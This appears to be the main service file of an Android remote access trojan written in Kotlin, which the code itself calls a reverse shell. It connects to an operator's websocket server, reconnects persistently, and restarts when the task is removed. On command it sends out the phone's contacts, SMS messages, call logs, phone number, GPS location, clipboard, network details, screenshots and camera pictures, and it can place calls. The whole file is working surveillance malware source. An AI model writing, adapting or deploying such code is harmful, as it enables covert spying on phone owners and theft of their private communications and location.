package com.nqmgaming.androidrat.service

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.Log
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.gson.Gson
import com.nqmgaming.androidrat.R
import com.nqmgaming.androidrat.command.Battery
import com.nqmgaming.androidrat.command.DeviceInfo
import com.nqmgaming.androidrat.command.IpAddress
import com.nqmgaming.androidrat.command.Screenshot
import com.nqmgaming.androidrat.core.util.Constant.IP_ADDRESS
import com.nqmgaming.androidrat.core.util.Constant.PORT
import com.nqmgaming.androidrat.core.util.MediaProjectionManagerHolder.mediaProjectionData
import com.nqmgaming.androidrat.data.dto.MessageDto
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okhttp3.Response
import okio.ByteString
import java.io.File
import java.util.Timer

class WebSocketService : Service() {

    private var client: OkHttpClient = OkHttpClient()
    private var webSocket: WebSocket? = null
    private var reconnectTimer: Timer? = null
    private var lastCommandTime: Long = 0
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private val deviceId = Build.ID

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate() {
        super.onCreate()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)

        createNotificationChannel()
        val notification: Notification = Notification.Builder(this, CHANNEL_ID)
            .setContentTitle("WebSocket Service")
            .setContentText("WebSocket Service is running")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .build()

        // Khởi tạo WebSocket
        connectWebSocket()

    }

    private fun connectWebSocket() {
        val request = Request.Builder().url("ws://${IP_ADDRESS}:${PORT}").build()
        webSocket = client.newWebSocket(request, object : WebSocketListener() {

            override fun onOpen(webSocket: WebSocket, response: Response) {
                // Send Device Info
                val message: String =
                    "Hello there, welcome to reverse shell of ${Build.MODEL} \n" + help
                webSocket.send(message)
                // Hủy Timer khi kết nối thành công
                reconnectTimer?.cancel()
            }


            @SuppressLint("Range")
            @RequiresApi(Build.VERSION_CODES.M)
            override fun onMessage(webSocket: WebSocket, text: String) {
                println("Received text: $text")
                lastCommandTime = System.currentTimeMillis()
                if (text.contains(deviceId)) {
                    onGetCommand(text, webSocket)
                }

            }

            @RequiresApi(Build.VERSION_CODES.M)
            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                val message = "Received bytes: ${bytes.utf8()}"
                println(message)
                if (message.contains(deviceId)) {
                    onGetCommand(bytes.utf8(), webSocket)
                }
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                webSocket.close(1000, null)
                println("Closing: $code / $reason")
            }


            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                // Bắt đầu Timer để thử kết nối lại sau mỗi 5 giây
                scheduleReconnect()
            }
        })
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Toast.makeText(this, "WebSocket Service started", Toast.LENGTH_SHORT).show()
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        val restartServiceIntent = Intent(applicationContext, this.javaClass)
        restartServiceIntent.setPackage(packageName)
        startService(restartServiceIntent)
        super.onTaskRemoved(rootIntent)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "WebSocket Service Channel"
            val descriptionText = "Channel for WebSocket Service"
            val importance = NotificationManager.IMPORTANCE_DEFAULT
            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
                description = descriptionText
            }
            val notificationManager: NotificationManager =
                getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun scheduleReconnect() {
        Log.d("WebSocketService", "Reconnecting in 5 seconds")
        reconnectTimer?.cancel() // Hủy Timer trước đó nếu có
        reconnectTimer = Timer().apply {
            schedule(object : java.util.TimerTask() {
                override fun run() {
                    connectWebSocket()
                }
            }, 5000)
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

//    override fun onDestroy() {
//        super.onDestroy()
//        webSocket.close(1000, null)
//    }

    companion object {
        const val CHANNEL_ID = "WebSocketServiceChannel"
        const val help = "Available commands:\n" +
                "1. help - Display this help message\n" +
                "2. info - Display device information\n" +
                "3. location - Get device location\n" +
                "4. ping - Check if device is online\n" +
                "5. phone_number - Get phone number\n" +
                "6. read_contacts - Read contacts\n" +
                "7. read_sms - Read SMS\n" +
                "8. read_call_logs - Read call logs\n" +
                "9. call - Make a call\n" +
                "10. sms - Send SMS\n" +
                "11. read_clipboard - Read clipboard content\n" +
                "12. take_picture - Take a picture\n" +
                "13. take_screen - Take a screenshot (please don't run it require fore background)'\n" +
                "14. battery - Get battery status\n" +
                "15. network_info - Get network information\n" +
                ". sleep - Put service to sleep\n"
    }

    @RequiresApi(Build.VERSION_CODES.M)
    private fun onGetCommand(command: String, webSocket: WebSocket) {
        if (command.contains("help")) {
            webSocket.send(help)
        } else if (command.contains("ping")) {
            webSocket.send("pong")
        } else if (command.contains("info")) {
            val info = DeviceInfo.getDeviceInfo()
            webSocket.send(info)
        } else if (command.contains("location")) {
            CoroutineScope(Dispatchers.IO).launch {
                // check if location permission is granted
                if (ContextCompat.checkSelfPermission(
                        applicationContext,
                        Manifest.permission.ACCESS_FINE_LOCATION
                    ) == PackageManager.PERMISSION_GRANTED
                ) {
                    withContext(Dispatchers.Main) {
                        println("Location permission granted")
                    }
                } else {
                    withContext(Dispatchers.Main) {
                        println("Location permission not granted")
                    }
                    return@launch
                }

                fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                    if (location != null) {
                        // Logic to handle location object
                        try {
                            val stringBuilder = StringBuilder()
                            stringBuilder.append("{\n")
                            stringBuilder.append("  \"latitude\": ${location.latitude},\n")
                            stringBuilder.append("  \"longitude\": ${location.longitude},\n")
                            stringBuilder.append("  \"accuracy\": ${location.accuracy},\n")
                            stringBuilder.append("  \"altitude\": ${location.altitude},\n")
                            stringBuilder.append("  \"speed\": ${location.speed},\n")
                            stringBuilder.append("  \"time\": ${location.time},\n")
                            stringBuilder.append("  \"provider\": \"${location.provider}\",\n")
                            stringBuilder.append("  \"bearing\": ${location.bearing},\n")
                            stringBuilder.append("  \"GoogleMap Link\": \"https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}\"\n")
                            stringBuilder.append("}")
                            webSocket.send(stringBuilder.toString())
                        } catch (e: Exception) {
                            e.printStackTrace()
                        }
                    }
                }
            }
        } else if (command.contains("phone_number")) {
            val telephoneManager =
                getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            val phoneNumber = "Target phone number: ${telephoneManager.line1Number}"
            webSocket.send(phoneNumber)
        } else if (command.contains("read_contacts")) {
            var contacts = ""
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                null,
                null,
                null
            )
            while (cursor!!.moveToNext()) {
                val name =
                    cursor.getString(cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val number =
                    cursor.getString(cursor.getColumnIndex(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER))
                contacts += "Name: $name\nNumber: $number\n\n"
            }
            cursor.close()
            webSocket.send(contacts)
        } else if (command.contains("read_sms")) {
            val cursor = contentResolver.query(
                android.provider.Telephony.Sms.CONTENT_URI,
                null,
                null,
                null,
                null
            )

            val messageList = mutableListOf<MessageDto>()
            while (cursor!!.moveToNext()) {
                val id = cursor.getString(cursor.getColumnIndex(Telephony.Sms._ID))
                val message =
                    cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY))
                val sender =
                    cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS))
                val receiver =
                    cursor.getString(cursor.getColumnIndex(Telephony.Sms.Inbox.PERSON))
                val date =
                    cursor.getString(cursor.getColumnIndex(Telephony.Sms.DATE))
                val messageDto =
                    MessageDto(id, message, date, deviceId, sender, receiver)
                messageList.add(messageDto)
            }
            cursor.close()

            // convert messageList to JSON string
            val messageListJson = Gson().toJson(messageList)
            webSocket.send(messageListJson)

        } else if (command.contains("read_call_logs")) {
            var callLogs = ""
            val cursor = contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI,
                null,
                null,
                null,
                null
            )
            while (cursor!!.moveToNext()) {
                val number =
                    cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))
                val name =
                    cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME))
                val status =
                    cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE))
                val duration =
                    cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION))
                callLogs += "Name: $name\nNumber: $number\nStatus: $status\nDuration: $duration\n\n"
            }
            cursor.close()
            webSocket.send(callLogs)
        } else if (command.contains("call")) {
            val number = "+1234567890"
            val intent = Intent(Intent.ACTION_CALL)
            intent.data = Uri.parse("tel:$number")
            startActivity(intent)
        } else if (command.contains("sms")) {
            val number = "+1234567890"
            val message = "Hello, this is a test message"
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse("sms:$number"))
            intent.putExtra("sms_body", message)
            startActivity(intent)
        } else if (command.contains("read_clipboard")) {
            // In WebSocketService.kt, inside the onMessage method for the "read_clipboard" command
            val clipboardRequestIntent =
                Intent("com.nqmgaming.androidrat.CLIPBOARD_REQUEST")
            applicationContext.sendBroadcast(clipboardRequestIntent)
        } else if (command.contains("battery")) {
            val batteryStatus = Battery.getAllBatteryInfo(applicationContext)
            webSocket.send(batteryStatus)
        } else if (command.contains("network_info")) {
            val networkInfo = IpAddress.getNetworkInfo(applicationContext)
            webSocket.send(networkInfo)
        } else if (command.contains("take_screen")) {
            val screenshotIntent =
                Intent(this@WebSocketService, ScreenshotService::class.java)
            screenshotIntent.action = "START_SCREENSHOT"
            screenshotIntent.putExtra("PROJECTION_DATA", mediaProjectionData)
            startService(screenshotIntent)
        } else if (command.contains("take_picture")) {
            val path = Screenshot.captureImage(this@WebSocketService, false)
            try {
                val file = File(path)
                if (file.exists()) {
                    webSocket.send("Image captured successfully")
                } else {
                    webSocket.send("Failed to capture image")
                }
            } catch (e: Exception) {
                webSocket.send("Failed to capture image")
            }
        } else {
            webSocket.send("Unknown command")
        }
    }

}
